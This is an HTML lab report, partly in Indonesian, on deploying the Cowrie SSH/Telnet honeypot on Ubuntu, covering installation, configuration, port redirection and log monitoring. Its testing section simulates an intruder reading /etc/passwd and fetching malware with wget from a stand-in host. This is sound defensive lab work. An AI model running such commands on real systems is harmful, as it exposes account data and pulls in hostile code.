<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cowrie Honeypot – SSH & Telnet Attack Detection</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">

  <style>
    body {
      background: #0f172a;
      color: #cbd5e1;
      font-family: 'Segoe UI', Arial, sans-serif;
    }
    h1, h2, h3 {
      color: #38bdf8;
    }
    .section {
      background: #172133;
      padding: 2em;
      margin-bottom: 2em;
      border-radius: 14px;
      border: 1px solid #23314d;
    }
    pre {
      background: #1e293b;
      color: #a5f3fc;
      padding: 1em;
      border-radius: 8px;
      white-space: pre-wrap;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 1em;
    }
    th, td {
      border: 1px solid #23314d;
      padding: 10px;
      text-align: center;
    }
    th {
      background: #1e293b;
      color: #38bdf8;
    }
    .warning {
      background: #7f1d1d;
      border: 1px solid #dc2626;
      padding: 1em;
      border-radius: 8px;
      margin-top: 1em;
    }
    .footer {
      text-align: center;
      opacity: 0.6;
      margin-top: 3em;
    }
  </style>
</head>

<body>
<div class="container">

  <h1 class="text-center mt-5 mb-3">
    Cowrie Honeypot – SSH & Telnet Attack Detection
  </h1>
  <p class="text-center">
    Experimenter: Lyam<br>
    OS: Ubuntu Server 22.04 LTS<br>
    Tool: Cowrie Honeypot v2.5.0
  </p>

  <!-- 1. Introduction -->
  <div class="section">
    <h2>1. Introduction</h2>
    <p>
      Cowrie adalah medium-interaction SSH dan Telnet honeypot yang
      dirancang untuk mendeteksi brute force attacks, merekam
      command attacker, serta mengumpulkan malware samples.
    </p>

    <ul>
      <li>Mendeteksi SSH/Telnet brute force</li>
      <li>Merekam command penyerang</li>
      <li>Mengumpulkan malware samples</li>
      <li>Analisis teknik dan tools attacker</li>
    </ul>
  </div>

  <!-- 2. Prerequisites -->
  <div class="section">
    <h2>2. Prerequisites</h2>
    <pre>
sudo apt update && sudo apt upgrade -y

sudo apt install -y git python3-virtualenv libssl-dev libffi-dev \
build-essential libpython3-dev python3-minimal authbind \
virtualenv python3-venv
    </pre>

    <pre>
sudo adduser --disabled-password --gecos "" cowrie
id cowrie
    </pre>
  </div>

  <!-- 3. Installation -->
  <div class="section">
    <h2>3. Cowrie Installation</h2>
    <pre>
sudo su - cowrie
git clone https://github.com/cowrie/cowrie.git
cd cowrie
    </pre>

    <pre>
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
    </pre>

    <pre>
bin/cowrie start
bin/cowrie status
bin/cowrie stop
    </pre>
  </div>

  <!-- 4. Configuration -->
  <div class="section">
    <h2>4. Cowrie Configuration</h2>
    <pre>
cp etc/cowrie.cfg.dist etc/cowrie.cfg
vim etc/cowrie.cfg
    </pre>

    <pre>
[honeypot]
hostname = production-server
sensor_name = honeypot-01
timezone = Asia/Jakarta

[ssh]
enabled = true
listen_port = 2222

[telnet]
enabled = true
listen_port = 2223
    </pre>
  </div>

  <!-- 5. Credentials -->
  <div class="section">
    <h2>5. Fake Credentials</h2>
    <pre>
root:x:!root
root:x:!admin
admin:x:password
ubuntu:x:ubuntu
    </pre>
  </div>

  <!-- 6. Port Redirection -->
  <div class="section">
    <h2>6. Port Redirection</h2>
    <pre>
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2223
    </pre>

    <pre>
Port 22222
sudo systemctl restart sshd
    </pre>
  </div>

  <!-- 7. Service -->
  <div class="section">
    <h2>7. Systemd Service</h2>
    <pre>
sudo systemctl enable cowrie
sudo systemctl start cowrie
sudo systemctl status cowrie
    </pre>
  </div>

  <!-- 8. Testing -->
  <div class="section">
    <h2>8. Testing Honeypot</h2>
    <pre>
ssh root@<honeypot-ip>
whoami
uname -a
cat /etc/passwd
wget http://malicious-site.com/malware
exit
    </pre>
  </div>

  <!-- 9. Logs -->
  <div class="section">
    <h2>9. Monitoring & Logs</h2>
    <pre>
tail -f var/log/cowrie/cowrie.log
tail -f var/log/cowrie/cowrie.json | jq '.'
    </pre>

    <pre>
ls -la var/lib/cowrie/downloads/
    </pre>
  </div>

  <!-- 10. Security -->
  <div class="section">
    <h2>10. Security Considerations</h2>

    <div class="warning">
      <ul>
        <li>Isolate honeypot network</li>
        <li>Jangan expose SSH management</li>
        <li>Backup logs secara berkala</li>
        <li>Monitor resource usage</li>
      </ul>
    </div>
  </div>

  <!-- 11. Conclusion -->
  <div class="section">
    <h2>11. Conclusion</h2>
    <p>
      Cowrie Honeypot berhasil diimplementasikan dan siap digunakan
      untuk mendeteksi SSH/Telnet attacks serta integrasi ke Wazuh SIEM.
    </p>
    <p><b>Status:</b> Active ✅</p>
    <p><b>Next Step:</b> Wazuh SIEM Integration</p>
  </div>

  <div class="footer">
    Cowrie Honeypot Deployment — Cybersecurity Lab
  </div>

</div>
</body>
</html>
